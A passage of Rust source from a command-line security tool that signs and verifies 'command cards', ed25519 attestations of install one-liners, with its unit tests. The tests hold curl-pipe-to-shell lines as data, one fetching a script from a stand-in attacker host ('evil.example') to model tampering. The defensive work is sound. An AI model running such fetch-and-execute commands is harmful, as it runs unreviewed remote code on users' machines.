//! M11 ch1 — signed "command cards".
//!
//! A command card is an ed25519-signed attestation of what a command *does*:
//! the exact command string, the domains it is expected to contact, the
//! SHA-256 of the script it pipes, the paths it writes, whether it needs
//! sudo, and an expiry date. A maintainer publishes a card alongside their
//! install one-liner; a user verifies the card against the command they are
//! about to run.
//!
//! ## v1 scope (attestation only — NO suppression)
//!
//! A *verified* card emits a single [`RuleId::CommandCardVerified`] (Info)
//! finding. It improves audit confidence but **does NOT change any other
//! finding's action or severity** — a `curl … | sh` with a valid card still
//! warns/blocks exactly as it would without the card. A *mismatched* card
//! (command text differs from the signed `command`) emits
//! [`RuleId::CommandCardMismatch`] (High). There is deliberately no
//! `expected_suppressed_rules` field and no suppression allowlist in v1;
//! card-driven suppression is a deferred v2 candidate.
//!
//! v1 verification checks ONLY the signature, the expiry, and the exact command
//! string. The attestation's other fields (`script_sha256`, `expected_domains`,
//! `writes`, `requires_sudo`) are signed and recorded but **NOT enforced** on
//! the hot path — enforcing `script_sha256`, for instance, would require
//! fetching the script body, which the no-network-on-`check` invariant forbids.
//! They document maintainer intent; do not read them as guarantees.
//!
//! ## Trust model (v1 — manual key distribution)
//!
//! Card signatures are verified against ed25519 public keys the operator has
//! explicitly trusted by dropping `<key_id>.pub` (32 raw bytes, hex, or
//! base64) into `~/.config/tirith/trusted-card-keys/`. The `key_id` is the
//! first 16 hex chars of `sha256(pubkey_bytes)`. A card signed by a key that
//! is not in that directory is treated as *unverified*: tirith does NOT emit
//! `CommandCardVerified` (it may emit an Info "signed by an untrusted key"
//! note instead). There is no automatic key fetch.
//!
//! ## No hot-path network
//!
//! Card *content* is only ever read from disk on the analysis hot path
//! (`tirith check`), via a `--card <path>` sidecar flag or a
//! `# tirith-card: <local-path>` shell comment. A URL-shaped reference is
//! never fetched during `tirith check` — the user must run
//! `tirith command-card fetch <url>` first (the only remote-I/O path), which
//! caches the card under `~/.cache/tirith/cards/<sha256>.json`.

use std::path::{Path, PathBuf};

use ed25519_dalek::{Signature, Signer, SigningKey, VerifyingKey};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Length of an ed25519 secret/private key in bytes.
pub const SECRET_KEY_LEN: usize = 32;
/// Length of an ed25519 public key in bytes.
pub const PUBLIC_KEY_LEN: usize = 32;
/// Length of an ed25519 signature in bytes.
pub const SIGNATURE_LEN: usize = 64;

/// The signature algorithm a card is signed with. v1 supports ONLY ed25519.
///
/// Modeled as a closed enum (not a free `String`) so the "only ed25519"
/// invariant is enforced at the type level: a card whose `algo` is anything but
/// `"ed25519"` (e.g. `"none"`, `"ED25519"`, `"rsa"`) FAILS to deserialize —
/// there is no catch-all arm — which kills the `algo: "none"` /
/// casing-confusion attack class at parse time rather than via a runtime string
/// compare. Serializes/deserializes as the lowercase string `"ed25519"`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum SignatureAlgo {
    /// Edwards-curve ed25519 (the only supported algorithm in v1).
    #[default]
    Ed25519,
}

impl std::fmt::Display for SignatureAlgo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SignatureAlgo::Ed25519 => write!(f, "ed25519"),
        }
    }
}

/// The signature block attached to a card.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CardSignature {
    /// Signature algorithm. v1 only supports [`SignatureAlgo::Ed25519`]; an
    /// unknown value fails at deserialize time.
    pub algo: SignatureAlgo,
    /// First 16 hex chars of `sha256(pubkey_bytes)` — identifies which trusted
    /// public key should verify this card.
    pub key_id: String,
    /// Lowercase-hex ed25519 signature over the canonical signing payload.
    pub value: String,
}

/// A command card: the unsigned attestation fields plus an optional signature.
///
/// The signature covers the [`Card::signing_payload`] — every field *except*
/// the signature block itself. Serializing/deserializing is plain JSON with
/// the field names the spec pins.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Card {
    /// The exact command the card attests to.
    pub command: String,
    /// Domains (or `host/path` prefixes) the command is expected to contact.
    #[serde(default)]
    pub expected_domains: Vec<String>,
    /// SHA-256 (hex) of the script the command downloads/pipes, if any.
    ///
    /// RECORDED-BUT-NOT-ENFORCED in v1. This field is part of the signed
    /// attestation, but `tirith check` does NOT compare it against the piped
    /// script body — enforcement would require fetching/reading the script on
    /// the hot path, which the no-network-on-check invariant forbids. v1
    /// verification checks ONLY the signature, expiry, and exact command match.
    /// Treat this as documentation of the maintainer's intent, not a guarantee
    /// that a server-side script swap is caught. (Enforcement is a v2 candidate
    /// once the script bytes are available out-of-band.)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub script_sha256: Option<String>,
    /// Filesystem paths the command is expected to write.
    #[serde(default)]
    pub writes: Vec<String>,
    /// Whether the command legitimately requires sudo.
    #[serde(default)]
    pub requires_sudo: bool,
    /// Expiry date in `YYYY-MM-DD`. A card past this date does not verify.
    pub expires: String,
    /// The ed25519 signature block. `None` for a freshly-created, unsigned card.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signature: Option<CardSignature>,
}

/// Why a card failed to verify (used internally + surfaced as Info notes).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum VerifyFailure {
    /// The card carries no signature block.
    Unsigned,
    /// The signature algorithm is not `ed25519`.
    UnsupportedAlgo(String),
    /// The signature or key_id field is malformed (bad hex / wrong length).
    MalformedSignature,
    /// No trusted public key matches the card's `key_id`.
    UntrustedKey,
    /// The ed25519 signature did not verify against the trusted key.
    BadSignature,
    /// The card's `expires` date is in the past.
    Expired,
    /// The `expires` field could not be parsed as `YYYY-MM-DD`.
    UnparseableExpiry,
}

impl VerifyFailure {
    /// A short, human-readable reason for the failure.
    pub fn reason(&self) -> String {
        match self {
            VerifyFailure::Unsigned => "card is not signed".to_string(),
            VerifyFailure::UnsupportedAlgo(a) => {
                format!("unsupported signature algorithm '{a}' (only ed25519)")
            }
            VerifyFailure::MalformedSignature => "card signature is malformed".to_string(),
            VerifyFailure::UntrustedKey => "card signature is from an untrusted key".to_string(),
            VerifyFailure::BadSignature => "card signature did not verify".to_string(),
            VerifyFailure::Expired => "card has expired".to_string(),
            VerifyFailure::UnparseableExpiry => "card has an unparseable expiry date".to_string(),
        }
    }
}

/// Errors from card I/O, signing, and parsing (CLI surface).
#[derive(Debug)]
pub enum CardError {
    /// Underlying I/O failure (read/write).
    Io(std::io::Error),
    /// JSON (de)serialization failure.
    Json(serde_json::Error),
    /// A key file was the wrong length or could not be decoded.
    BadKey(String),
    /// The card could not be signed/verified (e.g. unsupported algo).
    Crypto(String),
}

impl std::fmt::Display for CardError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            CardError::Io(e) => write!(f, "{e}"),
            CardError::Json(e) => write!(f, "{e}"),
            CardError::BadKey(m) => write!(f, "{m}"),
            CardError::Crypto(m) => write!(f, "{m}"),
        }
    }
}

impl std::error::Error for CardError {}

impl From<std::io::Error> for CardError {
    fn from(e: std::io::Error) -> Self {
        CardError::Io(e)
    }
}

impl From<serde_json::Error> for CardError {
    fn from(e: serde_json::Error) -> Self {
        CardError::Json(e)
    }
}

/// Lowercase-hex encode a byte slice (no `hex` crate dependency in this crate).
pub fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(char::from_digit((b >> 4) as u32, 16).unwrap());
        s.push(char::from_digit((b & 0x0f) as u32, 16).unwrap());
    }
    s
}

/// Decode a lowercase/uppercase hex string into bytes. Returns `None` on any
/// non-hex char or odd length.
pub fn hex_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim();
    if s.len() % 2 != 0 {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let hi = (bytes[i] as char).to_digit(16)?;
        let lo = (bytes[i + 1] as char).to_digit(16)?;
        out.push(((hi << 4) | lo) as u8);
        i += 2;
    }
    Some(out)
}

/// Compute the `key_id` for a public key: first 16 hex chars of
/// `sha256(pubkey_bytes)`.
pub fn key_id_for_pubkey(pubkey: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(pubkey);
    let digest = hasher.finalize();
    hex_encode(&digest)[..16].to_string()
}

/// SHA-256 (hex) of an arbitrary byte slice — used to name cached card files
/// and to compute a card's `script_sha256`.
pub fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex_encode(&hasher.finalize())
}

impl Card {
    /// Build a fresh, unsigned card from its attestation fields.
    pub fn new(
        command: String,
        expected_domains: Vec<String>,
        script_sha256: Option<String>,
        writes: Vec<String>,
        requires_sudo: bool,
        expires: String,
    ) -> Self {
        Card {
            command,
            expected_domains,
            script_sha256,
            writes,
            requires_sudo,
            expires,
            signature: None,
        }
    }

    /// The canonical bytes that the signature covers: the card with its
    /// `signature` field cleared, serialized as compact JSON. Both sign and
    /// verify use this exact serialization so the signature is stable.
    pub fn signing_payload(&self) -> Result<Vec<u8>, CardError> {
        let mut unsigned = self.clone();
        unsigned.signature = None;
        Ok(serde_json::to_vec(&unsigned)?)
    }

    /// Parse a card from JSON bytes.
    pub fn from_json(bytes: &[u8]) -> Result<Self, CardError> {
        Ok(serde_json::from_slice(bytes)?)
    }

    /// Serialize the card as pretty JSON.
    pub fn to_json_pretty(&self) -> Result<String, CardError> {
        Ok(serde_json::to_string_pretty(self)?)
    }

    /// Sign the card with a 32-byte ed25519 secret key, stamping the
    /// `signature` block (algo, key_id, hex signature).
    pub fn sign(&mut self, secret_key: &[u8; SECRET_KEY_LEN]) -> Result<(), CardError> {
        let signing_key = SigningKey::from_bytes(secret_key);
        let verifying_key = signing_key.verifying_key();
        let key_id = key_id_for_pubkey(&verifying_key.to_bytes());

        let payload = self.signing_payload()?;
        let sig: Signature = signing_key.sign(&payload);

        self.signature = Some(CardSignature {
            algo: SignatureAlgo::Ed25519,
            key_id,
            value: hex_encode(&sig.to_bytes()),
        });
        Ok(())
    }

    /// Verify the card's signature against a known public key. Returns `Ok(())`
    /// only when the signature is present, the algo is ed25519, the key_id
    /// matches the supplied pubkey, and the signature verifies. Does NOT check
    /// expiry — see [`Card::verify_against_trusted`] for the full check.
    pub fn verify_signature(&self, pubkey: &[u8; PUBLIC_KEY_LEN]) -> Result<(), VerifyFailure> {
        let sig_block = self.signature.as_ref().ok_or(VerifyFailure::Unsigned)?;
        // The algo is a closed enum (an unknown value already failed to
        // deserialize), so this match is total. The explicit arm keeps
        // `UnsupportedAlgo` reachable and forces a compile error if a future
        // variant is added without handling its verification path.
        match sig_block.algo {
            SignatureAlgo::Ed25519 => {}
        }
        // The supplied key must be the one the card names.
        if key_id_for_pubkey(pubkey) != sig_block.key_id {
            return Err(VerifyFailure::UntrustedKey);
        }
        let sig_bytes = hex_decode(&sig_block.value).ok_or(VerifyFailure::MalformedSignature)?;
        if sig_bytes.len() != SIGNATURE_LEN {
            return Err(VerifyFailure::MalformedSignature);
        }
        let signature =
            Signature::from_slice(&sig_bytes).map_err(|_| VerifyFailure::MalformedSignature)?;
        let verifying_key =
            VerifyingKey::from_bytes(pubkey).map_err(|_| VerifyFailure::MalformedSignature)?;
        let payload = self
            .signing_payload()
            .map_err(|_| VerifyFailure::MalformedSignature)?;
        verifying_key
            .verify_strict(&payload, &signature)
            .map_err(|_| VerifyFailure::BadSignature)
    }

    /// True when the card's `expires` date is today or later. A malformed
    /// expiry returns `Err(UnparseableExpiry)`.
    pub fn not_expired(&self, today: chrono::NaiveDate) -> Result<bool, VerifyFailure> {
        let exp = chrono::NaiveDate::parse_from_str(self.expires.trim(), "%Y-%m-%d")
            .map_err(|_| VerifyFailure::UnparseableExpiry)?;
        // Inclusive: a card is valid through the end of its expiry date.
        Ok(today <= exp)
    }

    /// Full trust check: resolve the card's `key_id` against the trusted-keys
    /// directory, verify the signature, and confirm the card has not expired.
    ///
    /// `trusted_keys_dir` is `~/.config/tirith/trusted-card-keys/` in
    /// production; tests pass a `tempfile::tempdir()`.
    pub fn verify_against_trusted(
        &self,
        trusted_keys_dir: &Path,
        today: chrono::NaiveDate,
    ) -> Result<(), VerifyFailure> {
        let sig_block = self.signature.as_ref().ok_or(VerifyFailure::Unsigned)?;
        // No string algo check here: `algo` is a closed enum (unknown values
        // fail to deserialize) and `verify_signature` re-checks it. We only
        // need the key_id to resolve the trusted key.
        let pubkey = load_trusted_pubkey(trusted_keys_dir, &sig_block.key_id)
            .ok_or(VerifyFailure::UntrustedKey)?;
        self.verify_signature(&pubkey)?;
        if !self.not_expired(today)? {
            return Err(VerifyFailure::Expired);
        }
        Ok(())
    }

    /// Does the card's `command` match `cmd` byte-for-byte (after trimming
    /// surrounding ASCII whitespace)? This is the mismatch gate.
    pub fn command_matches(&self, cmd: &str) -> bool {
        self.command.trim() == cmd.trim()
    }
}

/// Load a trusted public key (32 bytes) for `key_id` from `dir/<key_id>.pub`.
///
/// The `.pub` file may hold the key as 32 raw bytes, a 64-char hex string, or
/// standard base64. The decoded key's own key_id must equal `key_id` (so a
/// mislabeled file cannot impersonate a different key). Returns `None` if the
/// file is absent or cannot be decoded into a matching key.
pub fn load_trusted_pubkey(dir: &Path, key_id: &str) -> Option<[u8; PUBLIC_KEY_LEN]> {
    // Guard against path traversal via a crafted key_id from a card.
    if key_id.is_empty() || !key_id.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    let path = dir.join(format!("{key_id}.pub"));
    let raw = std::fs::read(&path).ok()?;
    let key = decode_pubkey_bytes(&raw)?;
    // Defense in depth: the file's content must actually be the key it claims.
    if key_id_for_pubkey(&key) != key_id {
        return None;
    }
    Some(key)
}

/// Decode public-key file contents into 32 raw bytes, accepting raw / hex /
/// base64 encodings.
fn decode_pubkey_bytes(raw: &[u8]) -> Option<[u8; PUBLIC_KEY_LEN]> {
    // Raw 32 bytes.
    if raw.len() == PUBLIC_KEY_LEN {
        let mut k = [0u8; PUBLIC_KEY_LEN];
        k.copy_from_slice(raw);
        return Some(k);
    }
    let text = std::str::from_utf8(raw).ok()?.trim();
    // Hex (64 chars).
    if let Some(decoded) = hex_decode(text) {
        if decoded.len() == PUBLIC_KEY_LEN {
            let mut k = [0u8; PUBLIC_KEY_LEN];
            k.copy_from_slice(&decoded);
            return Some(k);
        }
    }
    // Base64.
    use base64::Engine;
    if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(text) {
        if decoded.len() == PUBLIC_KEY_LEN {
            let mut k = [0u8; PUBLIC_KEY_LEN];
            k.copy_from_slice(&decoded);
            return Some(k);
        }
    }
    None
}

/// The directory where operators drop trusted card public keys:
/// `~/.config/tirith/trusted-card-keys/`.
pub fn trusted_card_keys_dir() -> Option<PathBuf> {
    crate::policy::config_dir().map(|d| d.join("trusted-card-keys"))
}

/// The directory where `tirith command-card fetch` caches downloaded cards:
/// `~/.cache/tirith/cards/`.
pub fn cards_cache_dir() -> Option<PathBuf> {
    let base = etcetera::choose_base_strategy().ok()?;
    use etcetera::BaseStrategy;
    Some(base.cache_dir().join("tirith").join("cards"))
}

/// The result of evaluating a card reference on the hot path.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CardOutcome {
    /// Card verified (trusted key, good signature, not expired) AND its
    /// command matches the analyzed command. Emits `CommandCardVerified`.
    Verified,
    /// Card verified but its command does NOT match the analyzed command.
    /// Emits `CommandCardMismatch` (High).
    Mismatch,
    /// The card could not be verified (untrusted key / bad sig / expired /
    /// unsigned). Carries the reason for an Info `CommandCardUnverified` note
    /// (NEVER `CommandCardVerified`).
    Unverified(VerifyFailure),
}

/// Reference to a card discovered on the hot path.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CardRef {
    /// A local path (sidecar `--card` flag or `# tirith-card: ./x.json`).
    LocalPath(String),
    /// A URL-shaped reference in a `# tirith-card:` comment. v1 does NOT fetch
    /// these on the hot path — it surfaces a "fetch first" warning instead.
    RemoteUrl(String),
}

/// Scan a command's text for a leading `# tirith-card: <ref>` shell comment.
///
/// The reference is the rest of the line after the marker. A value that starts
/// with `http://` or `https://` is classified as [`CardRef::RemoteUrl`] (never
/// fetched on the hot path); anything else is a [`CardRef::LocalPath`].
/// Returns the first such reference found.
///
/// SCOPE: only the LEADING prelude is scanned. We iterate from the top and stop
/// at the first non-empty line that is NOT a `# tirith-card:` marker — that line
/// is where the real command begins. A `# tirith-card:` string appearing AFTER
/// the command starts (e.g. inside a heredoc body or a later script line) is
/// command content, NOT transport metadata, and must be ignored here; otherwise
/// a heredoc carrying that text would skew the manifest match and spuriously
/// trip [`CardOutcome::Mismatch`].
///
/// Whitespace between the `#` and `tirith-card:` is flexible to stay in sync
/// with the tier-1 marker regex (`#\s*tirith-card:`): `#tirith-card:` (no space)
/// and `#  tirith-card:` (multiple) parse identically to the canonical
/// `# tirith-card:`. If they didn't, such a line would force past the tier-1
/// fast-exit yet be silently dropped here.
pub fn find_card_comment(input: &str) -> Option<CardRef> {
    for line in input.lines() {
        match card_comment_value(line) {
            Some(rest) => {
                let value = rest.trim();
                if value.is_empty() {
                    // A bare `# tirith-card:` with no ref: keep scanning the
                    // prelude (a later marker line may carry the ref).
                    continue;
                }
                return Some(classify_card_ref(value));
            }
            None => {
                // A blank line stays inside the leading prelude; a non-empty
                // non-marker line is the start of the real command — stop.
                if line.trim().is_empty() {
                    continue;
                }
                return None;
            }
        }
    }
    None
}

/// If `line` is a `# tirith-card: <ref>` marker (with flexible whitespace after
/// the `#`, matching the tier-1 `#\s*tirith-card:` regex), return the trailing
/// reference text (un-trimmed). `None` for any non-marker line. Shared by
/// [`find_card_comment`] and [`strip_card_comment_lines`] so the resolver and
/// the strip-before-compare step treat exactly the same lines as card markers.
fn card_comment_value(line: &str) -> Option<&str> {
    let after_hash = line.trim_start().strip_prefix('#')?;
    // `#\s*tirith-card:` — zero-or-more spaces between `#` and the keyword.
    after_hash.trim_start().strip_prefix("tirith-card:")
}

/// Classify a card reference value as a local path or a remote URL.
pub fn classify_card_ref(value: &str) -> CardRef {
    let lower = value.to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        CardRef::RemoteUrl(value.to_string())
    } else {
        CardRef::LocalPath(value.to_string())
    }
}

/// Remove any `# tirith-card: <ref>` marker line(s) from `input`, returning the
/// command text the card actually attests to. The marker is transport
/// metadata, never part of the signed command, so it MUST be stripped before
/// the byte-for-byte [`Card::command_matches`] comparison — otherwise a command
/// carried via a `# tirith-card:` comment would always falsely mismatch its own
/// (correctly-signed) card, since the analyzed input still contains the marker.
///
/// Matches the same flexible-whitespace marker shape as [`find_card_comment`]
/// (via [`card_comment_value`]), so exactly the line(s) the resolver treats as
/// the card reference are removed — including `#tirith-card:` / `#  tirith-card:`
/// variants. If this diverged from the resolver, a `#tirith-card:` line picked
/// up as the card ref would survive the strip and make the command falsely
/// mismatch its own signed card.
///
/// LINE ENDINGS ARE PRESERVED BYTE-FOR-BYTE. The body (everything from the first
/// real command line on) is returned verbatim — we do NOT split-and-rejoin it,
/// so a card command authored with `\r\n` (CRLF) endings still compares equal in
/// [`Card::command_matches`] instead of being silently normalized to `\n`. Only
/// the LEADING prelude (marker + any blank lines before the command) is removed;
/// the returned tail is exactly `&input[offset..]` where `offset` is the byte
/// position at which the command begins.
///
/// SCOPE (mirrors [`find_card_comment`]): only marker lines in the LEADING
/// prelude are stripped. Scanning stops at the first non-empty line that is not
/// a marker — every byte from there on (the real command, including any heredoc
/// body) is preserved VERBATIM, even if it happens to contain the text
/// `# tirith-card:`. Stripping such an in-body line would mutate the command
/// before [`Card::command_matches`] and cause a spurious mismatch.
pub fn strip_card_comment_lines(input: &str) -> String {
    input[prelude_end_offset(input)..].to_string()
}

/// Byte offset into `input` at which the real command begins, i.e. where the
/// leading `# tirith-card:` prelude (marker line(s) + any blank lines between
/// them and the command) ends. Returns `0` when there is no leading prelude (the
/// first non-empty line is not a marker), so the whole input is the command.
///
/// This is the single source of truth for "where does the prelude end"; both
/// [`strip_card_comment_lines`] (which returns `&input[offset..]` verbatim) and
/// [`has_card_comment_prelude`] derive from the same line scan, so the strip and
/// the resolver always agree on which leading lines are transport metadata. The
/// returned offset is always a line boundary, hence a valid `str` boundary.
fn prelude_end_offset(input: &str) -> usize {
    let mut offset = 0usize;
    // Only a prelude that ACTUALLY contains a `# tirith-card:` marker is
    // stripped. Leading blank lines are transport padding around a marker — they
    // are not, on their own, a reason to mutate the command. Without this guard
    // `"\n\necho hi"` (no marker) would return offset 2 and `strip_card_comment_lines`
    // would drop the blanks, diverging from `strip_card_comment_lines_cow`
    // (which borrows unchanged because `has_card_comment_prelude` is false) and
    // silently rewriting command text for direct callers.
    let mut marker_seen = false;
    // `split_inclusive('\n')` keeps each line's trailing separator (`\r\n` or
    // `\n`) attached, so summing the chunk lengths walks real byte offsets and
    // never drops a `\r`. The line content we classify is the chunk with its
    // line ending trimmed.
    for chunk in input.split_inclusive('\n') {
        let line = chunk.strip_suffix('\n').unwrap_or(chunk);
        let line = line.strip_suffix('\r').unwrap_or(line);
        if card_comment_value(line).is_some() {
            // A prelude marker line: drop it (transport metadata).
            marker_seen = true;
            offset += chunk.len();
            continue;
        }
        if line.trim().is_empty() {
            // Blank prelude line: provisionally part of the leading prelude. Kept
            // ONLY if a marker is present somewhere in the prelude (checked below);
            // otherwise the offset is reset to 0 so a marker-less blank prefix
            // leaves the command unchanged.
            offset += chunk.len();
            continue;
        }
        // First non-empty non-marker line: the command starts here. Everything
        // from this byte on is returned verbatim.
        break;
    }
    // No marker anywhere in the leading prelude → nothing to strip; the blanks we
    // walked are part of the command, not transport metadata.
    if marker_seen {
        offset
    } else {
        0
    }
}

/// `true` when `input`'s LEADING prelude contains at least one
/// `# tirith-card:` marker line — i.e. when [`strip_card_comment_lines`] would
/// actually remove something. Mirrors the prelude scope of [`find_card_comment`]
/// / [`strip_card_comment_lines`]: scanning stops at the first non-empty
/// non-marker line (a marker inside a heredoc body is command content, not a
/// prelude marker). Cheap: returns on the first marker or the first real line.
pub fn has_card_comment_prelude(input: &str) -> bool {
    for line in input.lines() {
        if card_comment_value(line).is_some() {
            return true;
        }
        if line.trim().is_empty() {
            // Blank line stays inside the leading prelude.
            continue;
        }
        // First non-empty non-marker line: the command starts here, no prelude
        // marker preceded it.
        return false;
    }
    false
}

/// Like [`strip_card_comment_lines`] but ZERO-allocation on the common path:
/// when `input` carries no leading `# tirith-card:` prelude marker, the original
/// is borrowed UNCHANGED. When a prelude marker IS present we allocate the
/// stripped command — but even then the body is preserved byte-for-byte
/// (`&input[offset..]`), so trailing newlines and `\r\n` (CRLF) endings survive
/// on both paths.
///
/// This is the form the engine's EXEC analysis path uses to feed prelude-free
/// command text into URL extraction and the exec-scoped rule set without paying
/// an allocation on every command that carries no card.
pub fn strip_card_comment_lines_cow(input: &str) -> std::borrow::Cow<'_, str> {
    if has_card_comment_prelude(input) {
        std::borrow::Cow::Owned(strip_card_comment_lines(input))
    } else {
        std::borrow::Cow::Borrowed(input)
    }
}

/// Evaluate an already-loaded card against the analyzed command, given the
/// trusted-keys directory and today's date. Pure: callers do the disk read for
/// the card and key files (or, in tests, supply a tempdir).
pub fn evaluate_card(
    card: &Card,
    cmd: &str,
    trusted_keys_dir: &Path,
    today: chrono::NaiveDate,
) -> CardOutcome {
    match card.verify_against_trusted(trusted_keys_dir, today) {
        Ok(()) => {
            if card.command_matches(cmd) {
                CardOutcome::Verified
            } else {
                CardOutcome::Mismatch
            }
        }
        Err(failure) => {
            // Reached ONLY on a verify failure (unsigned / untrusted key / bad
            // signature / expired / unparseable expiry). The command-mismatch
            // case is NOT reachable here — it requires a SUCCESSFUL verify and
            // is handled in the Ok arm above. Any verify failure is Unverified.
            CardOutcome::Unverified(failure)
        }
    }
}

/// Build the [`Finding`]s for a card outcome. v1 attestation-only contract:
///
/// * [`CardOutcome::Verified`] → one Info `CommandCardVerified` (the ONLY rule
///   that ever claims verification).
/// * [`CardOutcome::Mismatch`] → one High `CommandCardMismatch`.
/// * [`CardOutcome::Unverified`] → exactly one Info `CommandCardUnverified`
///   note (NEVER `CommandCardVerified` — a failed verify must not be tagged as
///   a verified one). This INCLUDES the `Unsigned` failure: this helper runs
///   only after a card REFERENCE was resolved and read, so an `Unsigned` outcome
///   means a card was SUPPLIED but unsigned — it must stay visible in audit/JSON,
///   not be silently dropped. (The genuinely card-LESS command stays silent via
///   an early return in the engine's `check_command_card_hot`, BEFORE this
///   helper is ever reached.)
///
/// Crucially, none of these change any OTHER finding's action — the engine's
/// action derivation runs over the full findings list unchanged.
pub fn findings_for_outcome(outcome: &CardOutcome) -> Vec<Finding> {
    match outcome {
        CardOutcome::Verified => vec![Finding {
            rule_id: RuleId::CommandCardVerified,
            severity: Severity::Info,
            title: "Command verified against a signed command card".to_string(),
            description: "A trusted, unexpired command card signed this exact command. \
                          This improves audit confidence but does not change the verdict — \
                          other findings still apply."
                .to_string(),
            evidence: vec![Evidence::Text {
                detail: "card signature verified against a trusted key".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }],
        CardOutcome::Mismatch => vec![Finding {
            rule_id: RuleId::CommandCardMismatch,
            severity: Severity::High,
            title: "Command does not match its signed command card".to_string(),
            description: "A trusted command card was found, but the command being run differs \
                          from the command the card attests to. The command may have been \
                          tampered with after the card was published."
                .to_string(),
            evidence: vec![Evidence::Text {
                detail: "signed card command != analyzed command".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }],
        CardOutcome::Unverified(failure) => {
            // Every Unverified case — INCLUDING `Unsigned` — emits the Info note.
            // This helper runs ONLY after a card REFERENCE was resolved and the
            // card was read+parsed (the engine's `check_command_card_hot` returns
            // early, before reaching here, when no `--card` flag and no
            // `# tirith-card:` comment were found). So "Unsigned" here means a
            // card WAS supplied but carries no signature — that must be VISIBLE in
            // audit/JSON, not hidden. The "no card → stay silent" case is handled
            // upstream by that early return, not by suppressing the finding here.
            vec![Finding {
                rule_id: RuleId::CommandCardUnverified,
                severity: Severity::Info,
                title: "Command card present but not verified".to_string(),
                description: format!(
                    "A command card was supplied but could not be verified ({}). \
                     Treating the command as if no card were present.",
                    failure.reason()
                ),
                evidence: vec![Evidence::Text {
                    detail: failure.reason(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }]
        }
    }
}

/// Generate a fresh ed25519 keypair, returning `(secret_key_bytes,
/// public_key_bytes)`. Uses the OS CSPRNG via `getrandom`. Helper for the
/// `command-card` CLI's key bootstrap and for tests.
pub fn generate_keypair() -> Result<([u8; SECRET_KEY_LEN], [u8; PUBLIC_KEY_LEN]), CardError> {
    let mut secret = [0u8; SECRET_KEY_LEN];
    getrandom::fill(&mut secret).map_err(|e| CardError::Crypto(format!("RNG failure: {e}")))?;
    let signing_key = SigningKey::from_bytes(&secret);
    let public = signing_key.verifying_key().to_bytes();
    Ok((secret, public))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn today() -> chrono::NaiveDate {
        chrono::NaiveDate::from_ymd_opt(2026, 5, 28).unwrap()
    }

    fn sample_card() -> Card {
        Card::new(
            "curl -fsSL https://example.com/install.sh | sh".to_string(),
            vec!["example.com".to_string()],
            None,
            vec!["/usr/local/bin/example".to_string()],
            false,
            "2026-08-01".to_string(),
        )
    }

    /// Write `<key_id>.pub` (raw 32 bytes) into `dir` for the given pubkey.
    fn write_trusted_key(dir: &Path, pubkey: &[u8; PUBLIC_KEY_LEN]) {
        let key_id = key_id_for_pubkey(pubkey);
        std::fs::write(dir.join(format!("{key_id}.pub")), pubkey).unwrap();
    }

    #[test]
    fn hex_roundtrip() {
        let bytes = [0x00u8, 0x0f, 0xa5, 0xff];
        let h = hex_encode(&bytes);
        assert_eq!(h, "000fa5ff");
        assert_eq!(hex_decode(&h).unwrap(), bytes);
    }

    #[test]
    fn key_id_is_16_hex_chars() {
        let (_, pubkey) = generate_keypair().unwrap();
        let id = key_id_for_pubkey(&pubkey);
        assert_eq!(id.len(), 16);
        assert!(id.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn sign_then_verify_roundtrips() {
        let (secret, pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        assert!(card.verify_signature(&pubkey).is_ok());
        // key_id on the card matches the signing key.
        assert_eq!(
            card.signature.as_ref().unwrap().key_id,
            key_id_for_pubkey(&pubkey)
        );
    }

    #[test]
    fn tampered_command_fails_signature() {
        let (secret, pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        // Mutate a signed field — signature must no longer verify.
        card.command = "curl -fsSL https://evil.example/x.sh | sh".to_string();
        assert_eq!(
            card.verify_signature(&pubkey),
            Err(VerifyFailure::BadSignature)
        );
    }

    #[test]
    fn wrong_key_is_untrusted() {
        let (secret, _pubkey) = generate_keypair().unwrap();
        let (_other_secret, other_pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        // Verifying with a different key whose key_id != card.key_id.
        assert_eq!(
            card.verify_signature(&other_pubkey),
            Err(VerifyFailure::UntrustedKey)
        );
    }

    #[test]
    fn verified_card_matching_command_is_verified() {
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card();
        card.sign(&secret).unwrap();

        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
